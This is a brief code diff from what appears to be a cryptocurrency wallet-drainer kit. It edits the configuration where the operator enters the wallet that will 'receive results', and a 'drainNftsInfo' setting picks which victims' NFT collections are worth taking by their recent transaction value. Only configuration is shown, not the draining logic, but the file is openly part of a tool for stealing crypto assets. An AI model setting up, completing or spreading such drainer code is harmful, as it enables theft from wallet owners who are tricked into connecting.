@@ -1,4 +1,4 @@
-const receiveAddress = "PUT YOUR WALLET HERE";
+const receiveAddress = "RECEIVER WALLET"; // Put your wallet adress that you want to receive results
 
 const drainNftsInfo = {
     minValue: 0.01, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
